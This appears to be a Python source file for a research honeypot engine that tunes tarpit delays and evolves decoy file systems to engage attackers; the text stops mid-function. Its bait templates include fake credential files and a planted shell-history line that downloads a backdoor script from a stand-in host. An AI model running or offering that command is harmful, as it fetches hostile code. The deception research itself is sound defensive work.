"""
Chameleon Meta-Heuristic Optimization Engine
============================================
Implements two novel bio-inspired optimization algorithms for adaptive honeypot deception:

1. Threat-Calibrated Particle Swarm Optimization (TC-PSO) - For adaptive tarpitting delay adjustment
   - Novel contribution: Dynamic inertia weight scaling based on BiLSTM anomaly scores
   - Mathematical innovation: w(t) = w_base * (1 - anomaly_score) for faster convergence on high threats

2. Semantic Deception RRT (S-RRT) - For dynamic deception schema evolution
   - Novel contribution: Exponential pheromone weighting with payload severity index
   - Mathematical innovation: Δτ * exp(PSI) for severity-amplified learning
   - Depth-decay multiplier for memory optimization: (1 - current_depth / max_depth)

Author: Chameleon Research Team
Date: March 2026
"""

import asyncio
import random
import math
import hashlib
import logging
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum

logger = logging.getLogger(__name__)


# ============================================================================
# Configuration Constants
# ============================================================================

class AttackCategory(str, Enum):
    """Supported attack categories for optimization."""
    SQLI = "SQLI"
    XSS = "XSS"
    SSI = "SSI"
    BRUTE_FORCE = "BRUTE_FORCE"
    RCE = "RCE"
    PATH_TRAVERSAL = "PATH_TRAVERSAL"
    GENERIC = "GENERIC"


# PSO Hyperparameters
PSO_CONFIG = {
    "num_particles": 15,
    "max_iterations": 50,
    "inertia_weight": 0.729,      # w: Controls momentum
    "cognitive_coefficient": 1.49445,  # c1: Self-confidence
    "social_coefficient": 1.49445,     # c2: Swarm confidence
    "min_delay": 0.5,             # Minimum tarpit delay (seconds)
    "max_delay": 12.0,            # Maximum tarpit delay (seconds)
    "fitness_decay": 0.95,        # Fitness memory decay factor
}

# TC-PSO Hyperparameters (Threat-Calibrated PSO)
TC_PSO_CONFIG = {
    **PSO_CONFIG,
    "anomaly_sensitivity": 0.5,   # Controls how strongly anomaly scores affect inertia
    "min_inertia_scale": 0.3,     # Minimum scaling factor for inertia (prevents stagnation)
}

# GA Hyperparameters
GA_CONFIG = {
    "population_size": 20,
    "num_generations": 30,
    "crossover_rate": 0.85,
    "mutation_rate": 0.15,
    "elitism_count": 3,           # Top individuals to preserve
    "schema_complexity_weight": 0.3,
}

# S-RRT Hyperparameters (Semantic Deception RRT)
S_RRT_CONFIG = {
    "num_trees": 20,  # Population size
    "initial_depth": 3,  # Initial tree depth
    "max_depth": 6,  # Maximum directory depth
    "expansion_rate": 0.4,  # Probability of expanding per generation
    "prune_threshold": 3,  # Generations before pruning dead branches
    "pheromone_decay": 0.95,  # Pheromone decay per generation
    "adaptive_step_min": 0.1,  # Minimum expansion step
    "adaptive_step_max": 0.8,  # Maximum expansion step
    "exploration_bonus": 0.3,  # Bonus for exploring new paths
    "severity_exponent_base": math.e,  # Base for exponential PSI weighting
    "depth_decay_enabled": True,  # Enable depth-decay multiplier for memory optimization
}

# Fitness function weights
FITNESS_WEIGHTS = {
    "w1_command_execution": 0.65,  # Weight for attacker engagement
    "w2_drop_penalty": 2.5,        # Penalty multiplier for disconnection
    "w3_interaction_bonus": 0.25,  # Bonus for file/path interactions
}


# ============================================================================
# Threat-Calibrated Particle Swarm Optimization (TC-PSO)
# Novel Contribution: Dynamic inertia scaling based on BiLSTM anomaly detection
# ============================================================================

@dataclass
class Particle:
    """Represents a single particle in the PSO swarm."""
    position: float  # Current delay value
    velocity: float  # Current velocity
    best_position: float  # Personal best position
    best_fitness: float = float('-inf')  # Personal best fitness
    fitness_history: List[float] = field(default_factory=list)


class ThreatCalibratedPSO:
    """
    Threat-Calibrated Particle Swarm Optimization (TC-PSO) for Adaptive Tarpit Delay Tuning.

    NOVEL CONTRIBUTION (Research Paper):
    ─────────────────────────────────────
    This algorithm extends standard PSO by incorporating real-time threat intelligence
    from a BiLSTM anomaly detector. The key innovation is dynamic inertia weight scaling:

    Mathematical Formulation:
    ─────────────────────────
    w(t) = w_base * (1 - α * anomaly_score)

    Where:
        - w_base: Base inertia weight (0.729, from standard PSO)
        - α: Anomaly sensitivity parameter (0.5 by default)
        - anomaly_score: BiLSTM output in range [0.0, 1.0]

    Higher anomaly scores indicate more threatening/malicious behavior,
    triggering lower inertia for faster convergence to optimal delays.

    Objective Function with Anomaly Calibration:
    ────────────────────────────────────────────
    F'(t) = F(t) * (1 + β * anomaly_score)

    Where:
        - F(t): Base fitness from attacker engagement
        - β: Reward amplification factor (0.3 by default)

    This ensures high-threat sessions receive proportionally higher rewards,
    accelerating learning for dangerous attack patterns.

    Attributes:
        particles (Dict[str, List[Particle]]): Swarm particles per attack category
        global_best (Dict[str, Tuple[float, float]]): Global best position & fitness
        session_tracker (Dict): Tracks active sessions and their metrics
        anomaly_scores (Dict[str, float]): Cached anomaly scores per category
    """

    def __init__(self):
        self.particles: Dict[str, List[Particle]] = {}
        self.global_best: Dict[str, Tuple[float, float]] = {}  # (position, fitness)
        self.session_tracker: Dict[str, Dict] = {}
        self.iteration_count: Dict[str, int] = {}
        self.anomaly_scores: Dict[str, float] = {}  # Cached anomaly scores per category

        # Initialize particles for each attack category
        for category in AttackCategory:
            self._initialize_swarm(category.value)

    def _initialize_swarm(self, category: str):
        """Initialize TC-PSO swarm for a specific attack category."""
        self.particles[category] = []
        self.iteration_count[category] = 0

        # Initialize global best with default moderate delay
        self.global_best[category] = (3.0, float('-inf'))
        
        # Initialize with default anomaly score (neutral)
        self.anomaly_scores[category] = 0.5

        for _ in range(TC_PSO_CONFIG["num_particles"]):
            # Random initial position within bounds
            position = random.uniform(
                TC_PSO_CONFIG["min_delay"],
                TC_PSO_CONFIG["max_delay"]
            )
            # Random initial velocity (bounded)
            max_velocity = (TC_PSO_CONFIG["max_delay"] - TC_PSO_CONFIG["min_delay"]) * 0.3
            velocity = random.uniform(-max_velocity, max_velocity)

            particle = Particle(
                position=position,
                velocity=velocity,
                best_position=position,
                best_fitness=float('-inf')
            )
            self.particles[category].append(particle)

    def _calculate_dynamic_inertia(self, category: str) -> float:
        """
        Calculate dynamic inertia weight based on BiLSTM anomaly score.

        NOVEL EQUATION (TC-PSO):
        ────────────────────────
        w_dynamic = w_base * max(min_scale, 1 - sensitivity * anomaly_score)

        This ensures:
        - High anomaly (close to 1.0) → Lower inertia → Faster convergence
        - Low anomaly (close to 0.0) → Higher inertia → More exploration
        - Inertia never drops below min_scale to prevent stagnation
        """
        w_base = TC_PSO_CONFIG["inertia_weight"]
        sensitivity = TC_PSO_CONFIG["anomaly_sensitivity"]
        min_scale = TC_PSO_CONFIG["min_inertia_scale"]
        
        anomaly_score = self.anomaly_scores.get(category, 0.5)
        
        # Apply novel dynamic scaling equation
        inertia_scale = max(min_scale, 1 - sensitivity * anomaly_score)
        w_dynamic = w_base * inertia_scale
        
        return w_dynamic

    async def get_optimal_delay(self, attack_category: str) -> float:
        """
        Retrieve the optimal tarpit delay for a given attack category.

        Uses the global best position from the TC-PSO swarm. If the category
        is unknown, returns a safe default delay.

        Args:
            attack_category: The type of attack detected (e.g., 'SQLI', 'XSS')

        Returns:
            float: Optimal delay in seconds (bounded by min/max config)
        """
        category = attack_category.upper()

        if category not in self.global_best:
            # Fallback for unknown categories
            return 2.5

        optimal_delay = self.global_best[category][0]

        # Ensure delay stays within bounds
        return max(
            TC_PSO_CONFIG["min_delay"],
            min(optimal_delay, TC_PSO_CONFIG["max_delay"])
        )

    async def update_fitness(
        self,
        attack_category: str,
        delay_used: float,
        commands_executed: int,
        dropped: bool,
        session_id: str = None,
        bilstm_anomaly_score: float = 0.5
    ):
        """
        Update particle fitness based on attacker session outcome with BiLSTM anomaly calibration.

        NOVEL CONTRIBUTION:
        ───────────────────
        This method extends standard PSO fitness update by:
        1. Caching the BiLSTM anomaly score for dynamic inertia calculation
        2. Scaling the objective function reward by the anomaly score

        Args:
            attack_category: Type of attack (e.g., 'SQLI', 'BRUTE_FORCE')
            delay_used: The delay that was applied during the session
            commands_executed: Number of commands the attacker executed
            dropped: True if attacker disconnected, False otherwise
            session_id: Optional session identifier for tracking
            bilstm_anomaly_score: Float 0.0-1.0 from BiLSTM anomaly detector
                                  (higher = more anomalous/threatening)
        """
        category = attack_category.upper()

        if category not in self.particles:
            self._initialize_swarm(category)

        # Cache anomaly score for this category (used in dynamic inertia)
        self.anomaly_scores[category] = max(0.0, min(1.0, bilstm_anomaly_score))

        # Calculate base fitness using the standard formula
        # F(t) = (w1 * C_exec) - (w2 * P_drop)
        w1 = FITNESS_WEIGHTS["w1_command_execution"]
        w2 = FITNESS_WEIGHTS["w2_drop_penalty"]

        c_exec = commands_executed
        p_drop = 1.0 if dropped else 0.0

        base_fitness = (w1 * c_exec) - (w2 * p_drop)

        # Add interaction bonus for sustained engagement
        if commands_executed > 5:
            base_fitness += FITNESS_WEIGHTS["w3_interaction_bonus"] * (commands_executed - 5)

        # NOVEL: Apply anomaly score as reward multiplier
        # F'(t) = F(t) * (1 + β * anomaly_score)
        anomaly_reward_factor = 1 + (0.3 * self.anomaly_scores[category])
        fitness = base_fitness * anomaly_reward_factor

        logger.info(
            f"TC-PSO Fitness Update | Category: {category} | "
            f"Delay: {delay_used:.2f}s | Commands: {c_exec} | "
            f"Dropped: {dropped} | Anomaly: {self.anomaly_scores[category]:.2f} | "
            f"Fitness: {fitness:.4f}"
        )

        # Update particles
        particles = self.particles[category]

        for particle in particles:
            # Find particle closest to the delay_used
            distance = abs(particle.position - delay_used)

            if distance < 1.5:  # Update particles near the used delay
                particle.fitness_history.append(fitness)

                # Apply fitness decay for historical memory
                if len(particle.fitness_history) > 5:
                    particle.fitness_history.pop(0)

                avg_fitness = sum(particle.fitness_history) / len(particle.fitness_history)

                # Update personal best
                if avg_fitness > particle.best_fitness:
                    particle.best_fitness = avg_fitness
                    particle.best_position = particle.position

                # Update global best
                if avg_fitness > self.global_best[category][1]:
                    self.global_best[category] = (particle.position, avg_fitness)
                    logger.info(
                        f"🎯 TC-PSO New Global Best | {category}: "
                        f"Delay={particle.position:.2f}s, Fitness={avg_fitness:.4f}, "
                        f"Anomaly={self.anomaly_scores[category]:.2f}"
                    )

        # Update velocity and position for all particles using dynamic inertia
        self._update_swarm(category)
        self.iteration_count[category] += 1

    def _update_swarm(self, category: str):
        """
        Update velocity and position for all particles in the swarm.

        NOVEL: Uses dynamic inertia weight based on cached anomaly score.
        """
        # Get dynamic inertia weight (novel contribution)
        w = self._calculate_dynamic_inertia(category)
        
        c1 = TC_PSO_CONFIG["cognitive_coefficient"]
        c2 = TC_PSO_CONFIG["social_coefficient"]

        g_best_pos = self.global_best[category][0]

        for particle in self.particles[category]:
            # Generate random coefficients
            r1 = random.random()
            r2 = random.random()

            # Update velocity using PSO formula:
            # v(t+1) = w·v(t) + c1·r1·(p_best - x(t)) + c2·r2·(g_best - x(t))
            cognitive = c1 * r1 * (particle.best_position - particle.position)
            social = c2 * r2 * (g_best_pos - particle.position)

            particle.velocity = w * particle.velocity + cognitive + social

            # Clamp velocity
            max_v = (TC_PSO_CONFIG["max_delay"] - TC_PSO_CONFIG["min_delay"]) * 0.3
            particle.velocity = max(-max_v, min(max_v, particle.velocity))

            # Update position
            particle.position += particle.velocity

            # Clamp position to bounds
            particle.position = max(
                TC_PSO_CONFIG["min_delay"],
                min(particle.position, TC_PSO_CONFIG["max_delay"])
            )

    def get_swarm_statistics(self, category: str) -> Dict:
        """Get statistical summary of the swarm for a category."""
        if category not in self.particles:
            return {}

        particles = self.particles[category]
        positions = [p.position for p in particles]
        fitnesses = [p.best_fitness for p in particles if p.best_fitness > float('-inf')]

        # Get global best fitness, handle -inf for JSON serialization
        global_best_fitness = self.global_best.get(category, (0, 0))[1]
        if global_best_fitness == float('-inf') or global_best_fitness == float('inf'):
            global_best_fitness = 0.0

        return {
            "category": category,
            "iterations": self.iteration_count.get(category, 0),
            "global_best_delay": self.global_best.get(category, (0, 0))[0],
            "global_best_fitness": global_best_fitness,
            "mean_position": sum(positions) / len(positions) if positions else 0,
            "std_position": math.sqrt(sum((x - sum(positions)/len(positions))**2 for x in positions) / len(positions)) if len(positions) > 1 else 0,
            "mean_fitness": sum(fitnesses) / len(fitnesses) if fitnesses else 0,
            "num_particles": len(particles),
            "current_anomaly_score": self.anomaly_scores.get(category, 0.5),
            "dynamic_inertia": self._calculate_dynamic_inertia(category),
        }


# ============================================================================
# Standard PSO (for benchmark comparison)
# ============================================================================

class AdaptiveTarpitPSO:
    """
    Standard Particle Swarm Optimization for Adaptive Tarpit Delay Tuning.
    
    This is the baseline PSO implementation without threat calibration,
    used for benchmark comparison against TC-PSO.
    """

    def __init__(self):
        self.particles: Dict[str, List[Particle]] = {}
        self.global_best: Dict[str, Tuple[float, float]] = {}
        self.session_tracker: Dict[str, Dict] = {}
        self.iteration_count: Dict[str, int] = {}

        for category in AttackCategory:
            self._initialize_swarm(category.value)

    def _initialize_swarm(self, category: str):
        """Initialize PSO swarm for a specific attack category."""
        self.particles[category] = []
        self.iteration_count[category] = 0
        self.global_best[category] = (3.0, float('-inf'))

        for _ in range(PSO_CONFIG["num_particles"]):
            position = random.uniform(
                PSO_CONFIG["min_delay"],
                PSO_CONFIG["max_delay"]
            )
            max_velocity = (PSO_CONFIG["max_delay"] - PSO_CONFIG["min_delay"]) * 0.3
            velocity = random.uniform(-max_velocity, max_velocity)

            particle = Particle(
                position=position,
                velocity=velocity,
                best_position=position,
                best_fitness=float('-inf')
            )
            self.particles[category].append(particle)

    async def get_optimal_delay(self, attack_category: str) -> float:
        """Retrieve the optimal tarpit delay for a given attack category."""
        category = attack_category.upper()

        if category not in self.global_best:
            return 2.5

        optimal_delay = self.global_best[category][0]
        return max(
            PSO_CONFIG["min_delay"],
            min(optimal_delay, PSO_CONFIG["max_delay"])
        )

    async def update_fitness(
        self,
        attack_category: str,
        delay_used: float,
        commands_executed: int,
        dropped: bool,
        session_id: str = None,
        bilstm_anomaly_score: float = None  # Ignored in standard PSO
    ):
        """Update particle fitness based on attacker session outcome."""
        category = attack_category.upper()

        if category not in self.particles:
            self._initialize_swarm(category)

        w1 = FITNESS_WEIGHTS["w1_command_execution"]
        w2 = FITNESS_WEIGHTS["w2_drop_penalty"]

        c_exec = commands_executed
        p_drop = 1.0 if dropped else 0.0

        fitness = (w1 * c_exec) - (w2 * p_drop)

        if commands_executed > 5:
            fitness += FITNESS_WEIGHTS["w3_interaction_bonus"] * (commands_executed - 5)

        logger.info(
            f"PSO Fitness Update | Category: {category} | "
            f"Delay: {delay_used:.2f}s | Commands: {c_exec} | "
            f"Dropped: {dropped} | Fitness: {fitness:.4f}"
        )

        particles = self.particles[category]

        for particle in particles:
            distance = abs(particle.position - delay_used)

            if distance < 1.5:
                particle.fitness_history.append(fitness)

                if len(particle.fitness_history) > 5:
                    particle.fitness_history.pop(0)

                avg_fitness = sum(particle.fitness_history) / len(particle.fitness_history)

                if avg_fitness > particle.best_fitness:
                    particle.best_fitness = avg_fitness
                    particle.best_position = particle.position

                if avg_fitness > self.global_best[category][1]:
                    self.global_best[category] = (particle.position, avg_fitness)
                    logger.info(
                        f"🎯 PSO New Global Best | {category}: "
                        f"Delay={particle.position:.2f}s, Fitness={avg_fitness:.4f}"
                    )

        self._update_swarm(category)
        self.iteration_count[category] += 1

    def _update_swarm(self, category: str):
        """Update velocity and position for all particles in the swarm."""
        w = PSO_CONFIG["inertia_weight"]
        c1 = PSO_CONFIG["cognitive_coefficient"]
        c2 = PSO_CONFIG["social_coefficient"]

        g_best_pos = self.global_best[category][0]

        for particle in self.particles[category]:
            r1 = random.random()
            r2 = random.random()

            cognitive = c1 * r1 * (particle.best_position - particle.position)
            social = c2 * r2 * (g_best_pos - particle.position)

            particle.velocity = w * particle.velocity + cognitive + social

            max_v = (PSO_CONFIG["max_delay"] - PSO_CONFIG["min_delay"]) * 0.3
            particle.velocity = max(-max_v, min(max_v, particle.velocity))

            particle.position += particle.velocity

            particle.position = max(
                PSO_CONFIG["min_delay"],
                min(particle.position, PSO_CONFIG["max_delay"])
            )

    def get_swarm_statistics(self, category: str) -> Dict:
        """Get statistical summary of the swarm for a category."""
        if category not in self.particles:
            return {}

        particles = self.particles[category]
        positions = [p.position for p in particles]
        fitnesses = [p.best_fitness for p in particles if p.best_fitness > float('-inf')]

        return {
            "category": category,
            "iterations": self.iteration_count.get(category, 0),
            "global_best_delay": self.global_best.get(category, (0, 0))[0],
            "global_best_fitness": self.global_best.get(category, (0, 0))[1],
            "mean_position": sum(positions) / len(positions) if positions else 0,
            "std_position": math.sqrt(sum((x - sum(positions)/len(positions))**2 for x in positions) / len(positions)) if len(positions) > 1 else 0,
            "mean_fitness": sum(fitnesses) / len(fitnesses) if fitnesses else 0,
            "num_particles": len(particles),
        }


# ============================================================================
# Semantic Deception RRT (S-RRT) - Novel Contribution
# Exponential pheromone weighting with payload severity index
# ============================================================================

@dataclass
class RRTNode:
    """
    Represents a node in the S-RRT deception tree.

    Each node represents a file/directory path with associated pheromone weights
    that indicate how attractive this path is to attackers.
    """
    path: str
    content: str
    parent: Optional['RRTNode'] = None
    children: Dict[str, 'RRTNode'] = field(default_factory=dict)
    pheromone_weight: float = 1.0  # Attractiveness score
    interaction_count: int = 0  # Times accessed by attackers
    age: int = 0  # Generations since creation
    is_leaf: bool = True


@dataclass
class DeceptionTree:
    """Represents a complete deception schema as a tree structure."""
    tree_id: str
    root: RRTNode
    fitness: float = 0.0
    total_interactions: int = 0
    depth: int = 0
    node_count: int = 0  # Track total nodes for memory analysis


class SemanticDeceptionRRT:
    """
    Semantic Deception RRT (S-RRT) - Novel Tree-Based Evolutionary Algorithm.

    NOVEL CONTRIBUTION (Research Paper):
    ─────────────────────────────────────
    This algorithm extends the 2025 IEEE Access RRT approach with two key innovations:

    1. Exponential Pheromone Weighting with Payload Severity Index (PSI):
    ─────────────────────────────────────────────────────────────────────
    Δτ' = Δτ * exp(PSI)

    Where:
        - Δτ: Base pheromone update
        - PSI: Payload Severity Index (1.0 to 3.0) from LLM analysis
        - exp: Natural exponential function (base e)

    This amplifies learning from high-severity payloads, enabling faster
    adaptation to dangerous attack patterns.

    2. Depth-Decay Multiplier for Memory Optimization:
    ──────────────────────────────────────────────────
    expansion_probability = base_prob * (1 - current_depth / max_depth)

    This strictly caps memory usage by reducing expansion probability
    as tree depth increases, preventing unbounded growth.

    Fitness Function (S-RRT variant):
    ─────────────────────────────────
    F(t) = Σ(pheromone_i * exp(PSI_i) * interaction_i) + depth_bonus - staleness_penalty

    Attributes:
        trees (Dict[str, DeceptionTree]): Population of deception trees
        generation (int): Current generation number
        path_pheromones (Dict[str, float]): Global pheromone map for all paths
        payload_severity_indices (Dict[str, float]): Cached PSI values per tree
    """

    def __init__(self):
        self.trees: Dict[str, DeceptionTree] = {}
        self.generation: int = 0
        self.path_pheromones: Dict[str, float] = {}  # Global pheromone map
        self.best_tree: Optional[DeceptionTree] = None
        self.best_fitness: float = float('-inf')
        self.interaction_history: Dict[str, List[str]] = {}  # tree_id -> [interacted_paths]
        self.payload_severity_indices: Dict[str, float] = {}  # Cached PSI per tree

        # S-RRT configuration
        self.rrt_config = S_RRT_CONFIG.copy()

        # Initialize tree population
        self._initialize_population()

    def _initialize_population(self):
        """Initialize S-RRT population with diverse deception trees."""
        schema_templates = self._get_schema_templates()

        for i in range(self.rrt_config["num_trees"]):
            tree_id = f"srrt_{self.generation:03d}_{i:02d}"

            # Create tree from template with variation
            template_name = list(schema_templates.keys())[i % len(schema_templates)]
            template = schema_templates[template_name]

            # Build tree structure from flat paths
            root = self._build_tree_from_paths(template, variation=i)

            tree = DeceptionTree(
                tree_id=tree_id,
                root=root,
                fitness=0.0,
                total_interactions=0,
                depth=self._calculate_tree_depth(root),
                node_count=self._count_nodes(root)
            )

            self.trees[tree_id] = tree
            self.interaction_history[tree_id] = []
            
            # Initialize with default PSI (neutral severity)
            self.payload_severity_indices[tree_id] = 2.0

            # Initialize global pheromones
            for path in template.keys():
                if path not in self.path_pheromones:
                    self.path_pheromones[path] = 1.0

    def _count_nodes(self, node: RRTNode) -> int:
        """Count total nodes in tree."""
        count = 1  # Count current node
        for child in node.children.values():
            count += self._count_nodes(child)
        return count

    def _build_tree_from_paths(
        self,
        paths_dict: Dict[str, str],
        variation: int = 0
    ) -> RRTNode:
        """Build a tree structure from flat file paths."""
        root = RRTNode(path="/", content="", is_leaf=False)

        for full_path, content in paths_dict.items():
            parts = [p for p in full_path.split('/') if p]

            if not parts:
                continue

            current = root
            for i, part in enumerate(parts):
                if part not in current.children:
                    node_path = '/' + '/'.join(parts[:i+1])
                    is_leaf = (i == len(parts) - 1)

                    node_content = content if is_leaf else ""
                    if is_leaf and variation > 0:
                        node_content = self._vary_content(content, variation)

                    new_node = RRTNode(
                        path=node_path,
                        content=node_content,
                        parent=current,
                        is_leaf=is_leaf
                    )
                    current.children[part] = new_node

                current = current.children[part]

            full_path_key = full_path
            if full_path_key not in self.path_pheromones:
                self.path_pheromones[full_path_key] = 1.0

        return root

    def _vary_content(self, content: str, variation: int) -> str:
        """Apply content variation to make trees diverse."""
        variations = [
            lambda c: c,
            lambda c: c + f"\n# Variant {variation}",
            lambda c: c.replace("admin", f"admin{variation % 5}"),
            lambda c: c + f"\n# Created: 2025-{(variation % 12) + 1:02d}-{(variation % 28) + 1:02d}",
        ]
        return variations[variation % len(variations)](content)

    def _calculate_tree_depth(self, node: RRTNode) -> int:
        """Calculate maximum depth of tree from given node."""
        if not node.children:
            return 0
        return 1 + max(self._calculate_tree_depth(child) for child in node.children.values())

    def _get_schema_templates(self) -> Dict[str, Dict[str, str]]:
        """Return base deception schema templates."""
        return {
            "linux_system": {
                "/etc/passwd": (
                    "root:x:0:0:root:/root:/bin/bash\n"
                    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
                    "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
                    "admin:x:1000:1000:Administrator:/home/admin:/bin/bash"
                ),
                "/etc/shadow": "root:$6$rounds=4096$randomsalt$hashedpassword:19000:0:99999:7:::",
                "/etc/hosts": "127.0.0.1\tlocalhost\n192.168.1.100\tdb-server.internal",
                "/var/log/auth.log": (
                    "Mar 10 08:23:15 server sshd[1234]: Accepted publickey for admin\n"
                    "Mar 10 09:45:32 server sudo: admin : TTY=pts/0 ; PWD=/home/admin"
                ),
            },
            "web_application": {
                "/var/www/html/config.php": (
                    "<?php\n"
                    "$db_host = 'localhost';\n"
                    "$db_user = 'webapp';\n"
                    "$db_pass = 'S3cr3t_P@ssw0rd!';\n"
                    "$db_name = 'production_db';\n"
                    "?>"
                ),
                "/var/www/html/.env": (
                    "DATABASE_URL=postgresql://admin:password123@localhost:5432/app\n"
                    "SECRET_KEY=sk_live_REDACTED_PLACEHOLDER_KEY\n"
                    "AWS_ACCESS_KEY_ID=AKIAREDACTEDPLACEHOLDER\n"
                    "AWS_SECRET_ACCESS_KEY=REDACTED_PLACEHOLDER_SECRET_KEY"
                ),
                "/var/www/html/backup.sql": (
                    "-- MySQL dump 10.13\n"
                    "-- Database: production_db\n"
                    "CREATE TABLE users (id INT, username VARCHAR(50), password_hash VARCHAR(255));\n"
                    "INSERT INTO users VALUES (1, 'admin', '$2y$10$hashedpassword...');"
                ),
            },
            "developer_workspace": {
                "/home/dev/.ssh/id_rsa": (
                    "-----BEGIN RSA PRIVATE KEY-----\n"
                    "MIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGy...\n"
                    "-----END RSA PRIVATE KEY-----"
                ),
                "/home/dev/.bash_history": (
                    "cd /var/www\n"
                    "cat config.php\n"
                    "mysql -u root -p\n"
                    "wget http://malicious-site.com/backdoor.sh"
                ),
                "/tmp/api_keys.json": (
                    '{\n'
                    '  "github_token": "ghp_REDACTED_PLACEHOLDER_TOKEN",\n'
                    '  "slack_webhook": "https://hooks.slack.com/services/REDACTED",\n'
                    '  "stripe_key": "sk_live_REDACTED_PLACEHOLDER"\n'
                    '}'
                ),
            },
            "database_admin": {
                "/var/lib/mysql/auto.cnf": (
                    "[auto]\n"
                    "server-uuid=12345678-1234-1234-1234-123456789abc\n"
                    "root_password=TempPass123!"
                ),
                "/root/.my.cnf": (
                    "[client]\n"
                    "user=root\n"
                    "password=RootP@ssw0rd2024\n"
                    "host=localhost"
                ),
                "/tmp/db_dump.sql": (
                    "-- Database backup created: 2024-03-10\n"
                    "CREATE DATABASE sensitive_data;\n"
                    "USE sensitive_data;\n"
                    "CREATE TABLE credentials (user VARCHAR(50), pass VARCHAR(255));"
                ),
            }
        }

    def _tree_to_flat_schema(self, node: RRTNode, schema: Dict[str, str] = None) -> Dict[str, str]:
        """Convert tree structure to flat {path: content} dictionary."""
        if schema is None:
            schema = {}

        if node.is_leaf and node.content:
            schema[node.path] = node.content

        for child in node.children.values():
            self._tree_to_flat_schema(child, schema)

        return schema

    def _get_all_leaf_paths(self, node: RRTNode) -> List[str]:
        """Get all leaf node paths from tree."""
        paths = []

        if node.is_leaf:
            paths.append(node.path)

        for child in node.children.values():
            paths.extend(self._get_all_leaf_paths(child))

        return paths

    def _find_node_by_path(self, node: RRTNode, target_path: str) -> Optional[RRTNode]:
        """Find a node in the tree by its path."""
        if node.path == target_path:
            return node

        for child in node.children.values():
            result = self._find_node_by_path(child, target_path)
            if result:
                return result

        return None

    async def get_tempting_schema(self) -> Tuple[str, Dict[str, str]]:
        """
        Retrieve the most tempting schema from the current tree population.

        Uses pheromone-weighted selection to choose a tree. Higher pheromone
        trees (more attractive to attackers) have greater selection probability.

        Returns:
            Tuple[str, Dict[str, str]]: (tree_id, fake_structure as flat dict)
        """
        if not self.trees:
            self._initialize_population()

        # Pheromone-weighted selection
        weights = [
            max(tree.fitness, 0.1) for tree in self.trees.values()
        ]
        total_weight = sum(weights)

        if total_weight == 0:
            tree_id = random.choice(list(self.trees.keys()))
        else:
            selection_point = random.uniform(0, total_weight)
            cumulative = 0

            tree_id = list(self.trees.keys())[0]
            for tid, tree in self.trees.items():
                cumulative += tree.fitness if tree.fitness > 0 else 0.1
                if cumulative >= selection_point:
                    tree_id = tid
                    break

        tree = self.trees[tree_id]
        tree.total_interactions += 1

        # Convert tree to flat schema for compatibility
        schema = self._tree_to_flat_schema(tree.root)

        logger.debug(f"S-RRT Selected tree: {tree_id} (fitness={tree.fitness:.2f}, depth={tree.depth}, nodes={tree.node_count})")

        return tree_id, schema

    async def evaluate_interaction(
        self,
        schema_id: str,
        interacted_paths: List[str],
        payload_severity_index: float = 2.0
    ) -> float:
        """
        Evaluate and update pheromones based on attacker interactions with S-RRT novelty.

        NOVEL CONTRIBUTION:
        ───────────────────
        This method implements exponential pheromone weighting:
        Δτ' = Δτ * exp(PSI)

        Args:
            schema_id: ID of the tree that was presented
            interacted_paths: List of file paths the attacker accessed
            payload_severity_index: Float 1.0-3.0 from LLM severity analysis
                                    (1.0=low, 2.0=medium, 3.0=critical)

        Returns:
            float: Updated fitness score
        """
        if schema_id not in self.trees:
            logger.warning(f"S-RRT: Unknown schema_id {schema_id}")
            return 0.0

        tree = self.trees[schema_id]

        # Cache PSI for this tree
        psi = max(1.0, min(3.0, payload_severity_index))
        self.payload_severity_indices[schema_id] = psi

        # Track interactions
        self.interaction_history[schema_id].extend(interacted_paths)

        # Update pheromones for interacted paths
        unique_paths = set(interacted_paths)
        pheromone_bonus = 0.0

        for path in unique_paths:
            # Update global pheromone map with NOVEL exponential weighting
            # Δτ' = Δτ * exp(PSI)
            base_bonus = 0.5
            exponential_bonus = base_bonus * math.exp(psi - 1)  # Normalize so PSI=1 gives base bonus
            
            if path in self.path_pheromones:
                self.path_pheromones[path] += exponential_bonus
            else:
                self.path_pheromones[path] = 1.0 + exponential_bonus

            # Find and update node in tree
            node = self._find_node_by_path(tree.root, path)
            if node:
                node.interaction_count += 1
                node.pheromone_weight += exponential_bonus
                pheromone_bonus += node.pheromone_weight

            # Bonus for sensitive files
            sensitive_keywords = ['password', 'secret', 'key', 'credential', 'backup', '.env', 'id_rsa']
            if any(keyword in path.lower() for keyword in sensitive_keywords):
                # Apply exponential PSI multiplier to sensitive file bonus too
                pheromone_bonus += 2.0 * math.exp(psi - 1)

        # Depth bonus: Reward realistic directory structures
        depth_bonus = tree.depth * 0.3

        # Staleness penalty
        staleness_penalty = tree.total_interactions * 0.05

        # Calculate fitness delta
        fitness_delta = pheromone_bonus + depth_bonus - staleness_penalty
        tree.fitness += fitness_delta

        logger.info(
            f"S-RRT Fitness Update | Tree: {schema_id} | "
            f"Interactions: {len(interacted_paths)} | PSI: {psi:.2f} | "
            f"Fitness Delta: {fitness_delta:.2f} | Total Fitness: {tree.fitness:.2f}"
        )

        # Update global best
        if tree.fitness > self.best_fitness:
            self.best_fitness = tree.fitness
            self.best_tree = tree

            leaf_count = len(self._get_all_leaf_paths(tree.root))
            logger.info(
                f"🌳 S-RRT New Best Tree | ID: {schema_id} | "
                f"Fitness: {tree.fitness:.2f} | Leaves: {leaf_count} | "
                f"Depth: {tree.depth} | Nodes: {tree.node_count} | PSI: {psi:.2f}"
            )

        return tree.fitness

    async def evolve_tree(self):
        """
        Execute one generation of S-RRT evolution with Depth-Decay optimization.

        NOVEL CONTRIBUTION:
        ───────────────────
        Implements depth-decay multiplier for memory optimization:
        expansion_probability = base_prob * (1 - current_depth / max_depth)

        This strictly caps memory usage by reducing expansion as depth increases.
        """
        if len(self.trees) < self.rrt_config["num_trees"]:
            return  # Need minimum population

        self.generation += 1

        # Sort trees by fitness
        sorted_trees = sorted(
            self.trees.values(),
            key=lambda t: t.fitness,
            reverse=True
        )

        # Calculate adaptive step-size based on success rate
        avg_fitness = sum(t.fitness for t in sorted_trees) / len(sorted_trees)
        success_rate = min(1.0, avg_fitness / 10.0)  # Normalize to [0, 1]

        # Adaptive expansion probability
        expansion_prob = (
            self.rrt_config["adaptive_step_min"] +
